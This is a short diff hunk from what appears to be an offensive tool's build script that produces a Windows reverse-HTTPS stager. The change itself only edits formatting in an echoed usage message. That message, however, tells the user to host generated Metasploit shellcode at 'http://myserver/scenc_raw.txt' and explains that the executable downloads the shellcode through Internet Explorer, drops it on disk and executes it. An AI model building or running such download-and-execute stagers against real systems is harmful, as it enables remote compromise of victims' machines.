@@ -59,9 +59,9 @@ strip output/downloadiexplorer_revhttps_win32.exe
 # cleanup
 cleanup_techniques
 
-echo "The generated msf shellcode file needs to be hosted on a HTTP server.\n
-Call the generated executable like:\n
-downloadiexplorer_revhttps_win32.exe http://myserver/scenc_raw.txt\n
-The executable will then download the shellcode file via internet explorer and drop the file on disk.\n
+echo "The generated msf shellcode file needs to be hosted on a HTTP server.
+Call the generated executable like:
+downloadiexplorer_revhttps_win32.exe http://myserver/scenc_raw.txt
+The executable will then download the shellcode file via internet explorer and drop the file on disk.
 The shellcode is then read from the file and executed."
 
